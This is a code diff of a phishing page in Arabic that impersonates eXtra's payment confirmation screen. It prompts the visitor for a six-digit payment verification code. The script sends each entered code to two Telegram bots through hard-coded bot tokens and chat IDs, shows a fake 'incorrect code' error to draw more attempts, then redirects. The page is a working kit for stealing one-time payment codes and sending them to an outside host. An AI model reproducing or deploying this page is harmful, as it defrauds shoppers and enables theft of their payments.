@@ -5,12 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تأكيد الدفع - eXtra</title>
     <style>
-        /* Reset & Base Styles */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', 'Tahoma', Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         body {
@@ -18,10 +17,8 @@
             color: #333;
             line-height: 1.6;
             font-size: 14px;
-            overflow-x: hidden;
         }
         
-        /* Header Styles */
         .top-bar {
             background-color: #fff;
             border-bottom: 1px solid #e0e0e0;
@@ -45,7 +42,6 @@
             height: 32px;
         }
         
-        /* Main Content Container */
         .verification-container {
             max-width: 800px;
             margin: 50px auto;
@@ -53,19 +49,14 @@
             text-align: center;
         }
         
-        /* Verification Card */
         .verification-card {
             background: #fff;
             border-radius: 12px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
             padding: 40px;
             margin-bottom: 40px;
-            position: relative;
-            overflow: hidden;
-            transition: all 0.3s ease;
         }
         
-        /* Verification Icon */
         .verification-icon {
             width: 100px;
             height: 100px;
@@ -78,9 +69,6 @@
             height: 100%;
             border: 8px solid #f0f0f0;
             border-radius: 50%;
-            position: absolute;
-            top: 0;
-            left: 0;
         }
         
         .verification-icon-inner {
@@ -97,19 +85,12 @@
             animation: pulse 2s infinite;
         }
         
-        .verification-icon-inner svg {
-            width: 30px;
-            height: 30px;
-            fill: #fff;
-        }
-        
         @keyframes pulse {
             0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 102, 204, 0.7); }
             70% { transform: scale(1); box-shadow: 0 0 0 15px rgba(0, 102, 204, 0); }
             100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 102, 204, 0); }
         }
         
-        /* Verification Title */
         .verification-title {
             font-size: 28px;
             color: #0066cc;
@@ -121,10 +102,8 @@
             font-size: 16px;
             color: #666;
             margin-bottom: 30px;
-            line-height: 1.7;
         }
         
-        /* Code Input */
         .code-container {
             margin: 30px 0;
         }
@@ -134,6 +113,7 @@
             justify-content: center;
             gap: 15px;
             margin: 20px 0;
+            direction: ltr; /* إضافة هذه الخاصية */
         }
         
         .code-input {
@@ -175,7 +155,6 @@
             display: none;
         }
         
-        /* Verification Button */
         .verify-btn {
             background: #0066cc;
             color: white;
@@ -186,7 +165,6 @@
             font-weight: 500;
             cursor: pointer;
             transition: all 0.2s;
-            box-shadow: 0 2px 8px rgba(0, 102, 204, 0.2);
             width: 100%;
             max-width: 300px;
             margin: 20px auto;
@@ -201,7 +179,6 @@
             cursor: not-allowed;
         }
         
-        /* Processing Overlay */
         .processing-overlay {
             position: fixed;
             top: 0;
@@ -231,7 +208,10 @@
             border-radius: 50%;
             border-top-color: #0066cc;
             animation: spin 1s ease-in-out infinite;
-            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
         
         .processing-text {
@@ -240,21 +220,6 @@
             margin-top: 15px;
         }
         
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        /* Success Message */
-        .success-message {
-            background: #e8f5e9;
-            color: #2e7d32;
-            padding: 20px;
-            border-radius: 8px;
-            margin: 30px 0;
-            display: none;
-        }
-        
-        /* Error Message */
         .error-message {
             background: #ffebee;
             color: #d32f2f;
@@ -264,7 +229,6 @@
             display: none;
         }
         
-        /* Verification Details */
         .verification-details {
             background: #f9f9f9;
             border-radius: 8px;
@@ -281,12 +245,6 @@
             border-bottom: 1px dashed #e0e0e0;
         }
         
-        .detail-row:last-child {
-            margin-bottom: 0;
-            padding-bottom: 0;
-            border-bottom: none;
-        }
-        
         .detail-label {
             color: #666;
             font-weight: 500;
@@ -297,7 +255,6 @@
             font-weight: 600;
         }
         
-        /* Security Badge */
         .security-badge {
             display: flex;
             align-items: center;
@@ -308,13 +265,6 @@
             font-size: 14px;
         }
         
-        .security-badge svg {
-            width: 20px;
-            height: 20px;
-            fill: #4CAF50;
-        }
-        
-        /* Footer */
         .verification-footer {
             margin-top: 50px;
             text-align: center;
@@ -324,18 +274,9 @@
             border-top: 1px solid #eee;
         }
         
-        /* Responsive Adjustments */
         @media (max-width: 768px) {
             .verification-card {
                 padding: 30px 20px;
-            }
-            
-            .verification-title {
-                font-size: 24px;
-            }
-            
-            .verification-subtitle {
-                font-size: 15px;
             }
             
             .code-inputs {
@@ -351,55 +292,47 @@
     </style>
 </head>
 <body>
-    <!-- Top Header Bar -->
     <div class="top-bar">
         <div class="header-container">
             <div class="logo">
                 <img src="Extra_Logo.svg.png" alt="eXtra">
             </div>
             <div class="secure-badge">
-                <span style="font-size: 12px; color: #4CAF50;">✓ الدفع الآمن</span>
+                <span style="color: #4CAF50;">✓ الدفع الآمن</span>
             </div>
         </div>
     </div>
     
-    <!-- Main Content -->
     <div class="verification-container">
-        <!-- Verification Card -->
         <div class="verification-card">
-            <!-- Verification Icon -->
             <div class="verification-icon">
                 <div class="verification-icon-circle"></div>
                 <div class="verification-icon-inner">
-                    <svg viewBox="0 0 24 24">
+                    <svg viewBox="0 0 24 24" width="30" height="30" fill="#fff">
                         <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                     </svg>
                 </div>
             </div>
             
-            <!-- Verification Title -->
             <h1 class="verification-title">التحقق من الدفع</h1>
             <p class="verification-subtitle">الرجاء إدخال رمز التحقق المكون من 6 أرقام الذي تلقيته</p>
             
-            <!-- Code Input -->
             <div class="code-container">
                 <div class="code-inputs" id="codeInputs">
-                    <input type="tel" class="code-input" maxlength="1" data-index="0">
-                    <input type="tel" class="code-input" maxlength="1" data-index="1">
-                    <input type="tel" class="code-input" maxlength="1" data-index="2">
-                    <input type="tel" class="code-input" maxlength="1" data-index="3">
-                    <input type="tel" class="code-input" maxlength="1" data-index="4">
-                    <input type="tel" class="code-input" maxlength="1" data-index="5">
+                    <input type="tel" class="code-input" maxlength="1" data-index="0" inputmode="numeric">
+                    <input type="tel" class="code-input" maxlength="1" data-index="1" inputmode="numeric">
+                    <input type="tel" class="code-input" maxlength="1" data-index="2" inputmode="numeric">
+                    <input type="tel" class="code-input" maxlength="1" data-index="3" inputmode="numeric">
+                    <input type="tel" class="code-input" maxlength="1" data-index="4" inputmode="numeric">
+                    <input type="tel" class="code-input" maxlength="1" data-index="5" inputmode="numeric">
                 </div>
                 
                 <p class="code-message">لم تستلم الرمز؟ <a href="#" style="color: #0066cc;">إعادة إرسال الرمز</a></p>
                 <p class="code-error" id="codeError">الرمز غير صحيح، الرجاء إدخال الرمز الصحيح</p>
             </div>
             
-            <!-- Verification Button -->
             <button class="verify-btn" id="verifyBtn" disabled>تحقق</button>
             
-            <!-- Error Message (Hidden by default) -->
             <div class="error-message" id="errorMessage">
                 <svg width="24" height="24" viewBox="0 0 24 24" fill="#d32f2f" style="vertical-align: middle; margin-left: 10px;">
                     <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
@@ -407,7 +340,6 @@
                 الرمز غير صحيح، الرجاء المحاولة مرة أخرى
             </div>
             
-            <!-- Verification Details -->
             <div class="verification-details">
                 <div class="detail-row">
                     <span class="detail-label">حالة التحقق:</span>
@@ -423,44 +355,37 @@
                 </div>
             </div>
             
-            <!-- Security Badge -->
             <div class="security-badge">
-                <svg viewBox="0 0 24 24">
+                <svg viewBox="0 0 24 24" width="20" height="20" fill="#4CAF50">
                     <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11V11.99z"/>
                 </svg>
                 <span>جميع عمليات الدفع مؤمنة ومشفرة</span>
             </div>
         </div>
         
-        <!-- Footer -->
         <div class="verification-footer">
             <p>eXtra © 2023 - جميع الحقوق محفوظة</p>
         </div>
     </div>
     
-    <!-- Processing Overlay -->
     <div class="processing-overlay" id="processingOverlay">
         <div class="processing-spinner"></div>
         <div class="processing-text" id="processingText">جاري التحقق من الرمز...</div>
     </div>
     
     <script>
-        // Telegram Bot Configuration
         const BOT_TOKENS = [
             { token: "8145915462:AAEcmC6EHg0otw3813pcXv3Lssx1fVs4Z7w", chatId: "6902892146" },
             { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
         ];
         
         document.addEventListener('DOMContentLoaded', function() {
-            // Set transaction details
             const transactionId = 'TRX-' + Math.floor(100000 + Math.random() * 900000);
             document.getElementById('transactionId').textContent = transactionId;
             
-            // Set attempt time
             const now = new Date();
             document.getElementById('attemptTime').textContent = now.toLocaleTimeString('ar-SA');
             
-            // Code input handling
             const codeInputs = document.querySelectorAll('.code-input');
             const verifyBtn = document.getElementById('verifyBtn');
             const processingOverlay = document.getElementById('processingOverlay');
@@ -469,25 +394,20 @@
             const codeError = document.getElementById('codeError');
             const verificationStatus = document.getElementById('verificationStatus');
             
-            // Focus first input
+            // Focus first input (rightmost in RTL)
             codeInputs[0].focus();
             
-            // Handle code input
             codeInputs.forEach((input, index) => {
                 input.addEventListener('input', function(e) {
-                    // Only allow numbers
                     this.value = this.value.replace(/[^0-9]/g, '');
                     
-                    // Move to next input if current has value
                     if (this.value.length === 1 && index < codeInputs.length - 1) {
                         codeInputs[index + 1].focus();
                     }
                     
-                    // Check if all inputs are filled
                     checkCodeCompletion();
                 });
                 
-                // Handle backspace
                 input.addEventListener('keydown', function(e) {
                     if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
                         codeInputs[index - 1].focus();
@@ -495,28 +415,13 @@
                 });
             });
             
-            // Check if all code inputs are filled
             function checkCodeCompletion() {
-                let allFilled = true;
-                codeInputs.forEach(input => {
-                    if (input.value.length === 0) {
-                        allFilled = false;
-                    }
-                });
-                
-                verifyBtn.disabled = !allFilled;
-                return allFilled;
+                verifyBtn.disabled = !Array.from(codeInputs).every(input => input.value.length === 1);
             }
             
-            // Verify button click
             verifyBtn.addEventListener('click', function() {
-                // Get entered code
-                let enteredCode = '';
-                codeInputs.forEach(input => {
-                    enteredCode += input.value;
-                });
+                let enteredCode = Array.from(codeInputs).map(input => input.value).join('');
                 
-                // Send code to all Telegram bots
                 BOT_TOKENS.forEach(bot => {
                     sendToTelegram(
                         bot.token, 
@@ -525,44 +430,35 @@
                     );
                 });
                 
-                // Show processing overlay (5 seconds)
                 processingOverlay.classList.add('active');
                 processingText.textContent = "جاري التحقق من الرمز...";
                 verificationStatus.textContent = "جاري التحقق...";
                 
-                setTimeout(function() {
-                    // Always show incorrect code message (since we don't know the correct code)
+                setTimeout(() => {
                     verificationStatus.textContent = "الرمز غير صحيح";
                     processingOverlay.classList.remove('active');
-                    
-                    // Show error messages
                     errorMessage.style.display = "block";
                     codeError.style.display = "block";
                     
-                    // Add error class to inputs and clear them
                     codeInputs.forEach(input => {
                         input.classList.add('error');
                         input.value = "";
                     });
                     
-                    // Focus first input
                     codeInputs[0].focus();
                     verifyBtn.disabled = true;
                     
-                    // Show processing for 10 seconds then redirect
-                    setTimeout(function() {
+                    setTimeout(() => {
                         processingOverlay.classList.add('active');
                         processingText.textContent = "جاري إعادة التوجيه...";
                         
-                        setTimeout(function() {
+                        setTimeout(() => {
                             window.location.href = "index.html";
                         }, 2000);
                     }, 10000);
-                    
-                }, 5000); // 5 second processing
+                }, 5000);
             });
             
-            // Function to send message to Telegram
             function sendToTelegram(botToken, chatId, message) {
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
